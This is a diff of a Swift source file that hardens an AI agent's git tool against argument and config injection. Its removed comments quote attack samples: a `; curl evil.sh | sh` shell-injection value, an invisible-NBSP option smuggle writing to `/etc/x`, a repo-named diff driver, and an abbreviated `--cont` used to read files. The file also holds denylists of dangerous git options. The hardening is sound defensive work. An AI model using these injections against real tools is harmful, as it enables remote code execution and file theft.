@@ -4,6 +4,8 @@
 //  GitIntegrationTool.swift
 //  Devgentic
 //
+//  Created by Raj Singh.
+//
 
 import Foundation
 import os
@@ -13,47 +15,24 @@ private let logger = DGLogger(category: "GitTool")
 // MARK: - Git Tool
 
 /// Result of resolving a git action to an argument vector.
-///
-/// `argv`, not a command string. The previous form built `"git -C \"\(repoPath)\" diff
-/// \(extraArgs)"` and handed it to `zsh -c`, with `extraArgs` interpolated UNQUOTED — so
-/// `args: "; curl evil.sh | sh"` needed no quote-break at all and simply ran. `args` and
-/// `path` are tool arguments supplied by the model, which means anything that can influence
-/// the model could reach a shell through a tool that profiles enable precisely BECAUSE they
-/// are withholding shell access.
+/// An argv, never a command string, so model-supplied `args` and `path` cannot reach a shell.
 enum GitCommandResolution {
     case argv([String])
     case error(String)
 }
 
-/// Pure logic for building git argument vectors from action + args. Extracted for testability.
+/// Pure logic for building git argument vectors from an action and its args.
 enum GitCommandBuilder {
 
-    /// Splits a shell-style argument STRING into argv words — and does nothing else.
-    ///
-    /// `args` is documented as free-form git arguments (`-n 5`, `--author="J Smith"`), so it
-    /// genuinely needs word-splitting and quote removal. It does NOT need, and deliberately
-    /// does not get, any other shell behaviour: no globbing, no `$VAR`, no `$(…)`, no
-    /// operators. `;` and `|` survive tokenisation as ordinary characters and reach `git` as
-    /// literal arguments, where they are rejected as unknown revisions rather than executed.
-    ///
-    /// A naive `split(separator: " ")` would be wrong in the other direction — it breaks
-    /// `--author="J Smith"` into two arguments — which is why this is a real tokenizer and not
-    /// a one-liner.
-    ///
-    /// Separators are the POSIX `IFS` set this is emulating — space, tab, newline (and CR, for
-    /// text that arrived with Windows line endings) — and deliberately NOT
-    /// `Character.isWhitespace`, which is the UNICODE whitespace set. The difference is
-    /// exploitable: `Character.isWhitespace` is true for U+00A0 NBSP, U+2000–200A, U+2028/2029,
-    /// U+3000 and more, so `HEAD~1<NBSP>--output=/etc/x` split into two argv words — the second
-    /// an OPTION — where a shell, and git handed the same bytes as one argument, both keep it
-    /// as a single literal token. An operator reading the raw `args` string sees one innocuous
-    /// revision name, because the separator is invisible.
+    // Why: a plain split on spaces would break quoted arguments such as `--author="J Smith"`, so this stays a real tokenizer.
+    /// Splits a shell-style argument string into argv words (word-splitting and quote removal only).
+    /// No globbing, `$VAR` or operators: `;` and `|` reach git as literal arguments.
+    /// Separators are the POSIX IFS set, not Unicode whitespace, so an invisible NBSP cannot split off an option.
     private static let separatorScalars: Set<Unicode.Scalar> = [" ", "\t", "\n", "\r"]
 
-    /// Tested scalar-wise because a Swift `Character` is a grapheme CLUSTER: `\r\n` is a single
-    /// Character and so matches neither `"\r"` nor `"\n"` in a `Set<Character>`. Getting that
-    /// wrong fails in the safe direction — the tokens stay joined and inert — but it silently
-    /// mangles any `args` that arrived with Windows line endings.
+    // Why: tested scalar-wise because `\r\n` is a single Character and matches neither `"\r"` nor `"\n"`,
+    // which would silently mangle `args` that arrive with Windows line endings.
+    /// Reports whether every unicode scalar of the character is a separator.
     private static func isSeparator(_ character: Character) -> Bool {
         character.unicodeScalars.allSatisfy { separatorScalars.contains($0) }
     }
@@ -91,20 +70,9 @@ enum GitCommandBuilder {
         return tokens
     }
 
-    /// Global `-c` overrides applied to EVERY invocation, ahead of the subcommand.
-    ///
-    /// A repository is data, but git treats parts of it as CODE: `diff.external` and
-    /// `core.fsmonitor` name programs git executes, and both live in `<repo>/.git/config` —
-    /// a file any write primitive can plant (including, before `deniedAnywhere` below, this
-    /// tool's own `--output`). The trigger then needs no arguments at all: a bare `diff` runs
-    /// `diff.external`, a bare `status` runs `core.fsmonitor`. **Argument validation alone
-    /// therefore cannot close this**, which is why the config is neutralised at the point of
-    /// invocation rather than filtered at the argument layer.
-    ///
-    /// These are `-c` (a PRE-subcommand global) and not the equivalent flags on purpose:
-    /// `args` is always appended AFTER the subcommand, and a flag can be re-enabled by a later
-    /// one. Verified against /usr/bin/git: `-c diff.external=` wins even when the caller passes
-    /// `--ext-diff`, whereas `--no-ext-diff --ext-diff` re-enables the external program.
+    /// Global `-c` overrides applied to every invocation, ahead of the subcommand.
+    /// They neutralise repo-configured programs git would execute (`diff.external`, `core.fsmonitor`).
+    /// Passed as pre-subcommand `-c` rather than flags because a later flag in `args` could re-enable them.
     static let hardening: [String] = [
         // Runs a program whenever git consults the index — including `status`, the one action
         // that takes no arguments at all.
@@ -118,15 +86,11 @@ enum GitCommandBuilder {
         "-c", "core.pager=cat",
     ]
 
-    /// Environment overrides for EVERY git process this app runs — the agent's `git` tool, the Git
-    /// Changes panel (`GitUICommand`) and `GitRepositoryLocator`. One source, so a fix lands in all.
-    ///
-    /// - `TERM=dumb` keeps colour escapes out of output that is parsed or read by the model.
-    /// - `GIT_OPTIONAL_LOCKS=0`: without it a read-only `git status` opportunistically refreshes the
-    ///   index stat cache — taking `.git/index.lock` and rewriting `.git/index`. Verified 2026-10-04
-    ///   (git 2.54): a stat-stale index is REWRITTEN by a plain `status` and untouched with this set.
-    ///   An agent `status` overlapping the user's own `git commit` / `git add` therefore made the
-    ///   USER's command fail with "Unable to create '.git/index.lock': File exists".
+    // Why: without it `status` can rewrite `.git/index` under `index.lock`,
+    // making a concurrent user `git commit` or `git add` fail.
+    /// Environment overrides for every git process the app runs (agent tool, Git Changes panel, locator).
+    /// `TERM=dumb` keeps colour escapes out of parsed output.
+    /// `GIT_OPTIONAL_LOCKS=0` stops a read-only `git status` from taking the index lock.
     static let environmentOverrides: [String: String] = [
         "TERM": "dumb",
         "GIT_OPTIONAL_LOCKS": "0",
@@ -139,64 +103,28 @@ enum GitCommandBuilder {
     }
 
     /// Flags that suppress repo-nominated diff programs, passed on every diff-family action.
-    ///
-    /// ⚠️ `hardening` is NOT sufficient on its own, and the earlier claim that it was is wrong.
-    /// `-c diff.external=` empties the GLOBAL external-diff hook, but a repository can name its
-    /// own driver — `.gitattributes` saying `*.dat diff=evil` plus `[diff "evil"] command = …`
-    /// in `.git/config` — and the driver's key contains a repo-chosen NAME, so no fixed `-c`
-    /// can empty it. Reproduced against /usr/bin/git 2026-07-31: with the full `hardening` set
-    /// applied, a plain `git diff` on such a repo still executed the named program. `--no-ext-diff`
-    /// stops it; `--no-textconv` stops the textconv variant.
-    ///
-    /// These are passed BEFORE the caller's `args` so a later `--ext-diff` could re-enable them —
-    /// which is why both are also in `deniedAnywhere`.
+    /// `hardening` is not enough: a repo can name its own diff driver, which no fixed `-c` can empty.
+    /// Passed before the caller's `args`; both flags are also in `deniedAnywhere` so they cannot be re-enabled.
     static let diffProgramSuppression: [String] = ["--no-ext-diff", "--no-textconv"]
 
-    /// Options refused for every action.
-    ///
-    /// **Argv stops the SHELL; it does not stop git's own option parser.** Each entry was
-    /// confirmed to work against /usr/bin/git before being listed:
-    ///   - `--output=<path>` creates or TRUNCATES any file on disk and fills it with git output.
-    ///   - `--no-index <a> <b>` diffs two arbitrary paths; `-C <repo>` is not honoured, so it
-    ///     reads anything this process can read.
-    ///   - `--contents <file>` (blame) reads an arbitrary file and echoes it into the output.
-    ///   - `--ext-diff` / `--textconv` re-request a repo-nominated program. `hardening` already
-    ///     empties `diff.external`, but a `.gitattributes` textconv driver cannot be neutralised
-    ///     by config (its name is chosen by the repo), so `--no-textconv` is passed per-action
-    ///     below and `--textconv` must not be able to countermand it.
-    ///
-    /// A denylist is inherently incomplete — a future git option could open a new primitive.
-    /// It is the SECOND layer; `hardening` is what makes code execution unreachable.
+    /// Options refused for every action, because argv stops the shell but not git's own option parser.
+    /// Covers file writes (`--output`), arbitrary reads (`--no-index`, `--contents`) and re-enabling repo programs.
+    /// A denylist is the second layer and inherently incomplete; `hardening` makes code execution unreachable.
     static let deniedAnywhere: Set<String> = [
         "--output", "--no-index", "--contents", "--ext-diff", "--textconv",
     ]
 
-    /// `branch` is forced into list mode with `-a`, which already refuses a bare branch name —
-    /// but not these, which mutate the repository: `branch -a -M <new>` renames the checked-out
-    /// branch, and `-u`/`--track`/`--edit-description` write config or refs.
-    ///
-    /// Scoped to `branch` rather than global because `-c` and `-C` mean "copy branch" HERE and
-    /// something harmless elsewhere (`git log -c` is a combined diff), and `-t` likewise.
+    /// Options refused for `branch`, which runs in list mode (`-a`); these would rename, delete or write config/refs.
+    /// Scoped to `branch` because `-c`, `-C` and `-t` mean something harmless elsewhere (e.g. `git log -c`).
     static let deniedForBranch: Set<String> = [
         "-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C", "--copy",
         "-u", "--set-upstream-to", "--unset-upstream", "--edit-description",
         "-f", "--force", "-t", "--track", "--create-reflog",
     ]
 
-    /// Matches on the option NAME — the part before any `=` — so `--output=x` and `--output x`
-    /// are both caught.
-    ///
-    /// ⚠️ Long options match by PREFIX, not exact equality, and the comment that used to sit here
-    /// claiming "git does not accept abbreviated long options — verified" was simply false.
-    /// Reproduced 2026-07-31: `git blame --cont <file> a.txt` resolves to `--contents` and printed
-    /// the file, walking straight past an exact-match denylist. Git accepts any UNAMBIGUOUS
-    /// abbreviation of a long option, so a denylist keyed on full spellings only stops the
-    /// spelling an honest caller would use.
-    ///
-    /// Prefix matching is deliberately over-broad: `--co` is refused even though git would call
-    /// it ambiguous, because refusing a legal-but-ambiguous option costs a caller nothing and
-    /// reasoning about which abbreviations are currently unambiguous means tracking git's option
-    /// table forever. Short options stay exact — `-c` is one flag, not a prefix of anything.
+    // Why: prefix matching is deliberately over-broad (ambiguous abbreviations are refused too); short options stay exact.
+    /// Returns a refusal message when `tokens` contain a denied option for `action`, else nil.
+    /// Matches the option name (before any `=`); long options match by prefix because git accepts abbreviations.
     static func rejectionReason(action: String, tokens: [String]) -> String? {
         let denied = deniedAnywhere.union(action == "branch" ? deniedForBranch : [])
         for token in tokens where token.hasPrefix("-") {
@@ -220,18 +148,13 @@ enum GitCommandBuilder {
         let base = ["-C", repoPath] + hardening
         let extra = tokenize(extraArgs)
 
-        // Rejected BEFORE the action switch so an unknown action cannot be used to probe which
-        // options a given subcommand accepts.
+        // Rejected before the action switch so an unknown action cannot probe which options a subcommand accepts.
         if let reason = rejectionReason(action: action, tokens: extra) {
             return .error(reason)
         }
 
-        // `diffProgramSuppression` (`--no-ext-diff --no-textconv`) on every action that renders
-        // file content. A `.gitattributes` entry can nominate a diff driver by NAME, and the
-        // driver's config key contains that name — so no fixed `-c` in `hardening` can empty it.
-        // Reproduced 2026-07-31: with the full hardening applied, a plain `diff` on a repo
-        // carrying `[diff "evil"] command = …` still executed the program. Both flags are also
-        // denied in `extra`, so nothing the caller passes can countermand them.
+        // Suppress repo-nominated diff drivers on every action that renders file content; `extra` denies both flags so
+        // a caller cannot countermand them.
         switch action {
         case "status":
             return .argv(base + ["status", "--short"])
@@ -322,32 +245,19 @@ struct GitTool: DevgenticTool {
         case .argv(let argv):
             gitArgv = argv
         case .error(let msg):
-            // A refusal is only visible to the MODEL unless it is logged. An operator asking
-            // "why did the agent claim it could not read that file?" otherwise has nothing —
-            // the tool returned a string and no trace of the denied option survives.
+            // Logged because a refusal is otherwise visible only to the model, leaving operators no trace of the denied option.
             logger.notice("[GIT_DENY] action='\(arguments.action)' refused — \(msg) | args: \(extraArgs)")
             return msg
         }
 
         do {
-            // `ProcessRunner` drains stdout and stderr CONCURRENTLY. This site read them in
-            // sequence after `waitUntilExit()`, which deadlocks once either passes the ~64 KB
-            // pipe buffer — and `git log` / `git diff` pass it routinely.
-            //
-            // Invoked DIRECTLY, never through `zsh -c`: see `GitCommandResolution`. The environment
-            // (dumb TERM, no optional index locks) comes from `GitCommandBuilder.environment` — the
-            // one source shared with the Git Changes panel.
+            // Invoked directly, never through `zsh -c`; `ProcessRunner` drains stdout and stderr concurrently.
+            // The environment comes from `GitCommandBuilder.environment`, shared with the Git Changes panel.
             let run = try ProcessRunner.run(executable: "/usr/bin/git", arguments: gitArgv,
                                             environment: GitCommandBuilder.environment())
 
-            // "Error:"-prefixed so `ToolExecutionMediator.isSemanticFailure` actually classifies
-            // it. The previous "Git error:" missed by ONE WORD — the sniffer tests
-            // `hasPrefix("error")`, so this tool correctly detected the failure, reported it,
-            // and then had it recorded as a success.
-            //
-            // The old condition also required non-empty stderr, so a non-zero exit with silent
-            // stderr fell through to the success return — the exit code counted only when
-            // stderr happened to be populated.
+            // "Error:"-prefixed so `ToolExecutionMediator.isSemanticFailure` classifies it as a failure.
+            // A non-zero exit counts as failure even when stderr is empty.
             guard run.succeeded else {
                 let detail = run.standardError.isEmpty
                     ? (run.standardOutput.isEmpty ? "(no output on stdout or stderr)" : run.standardOutput)
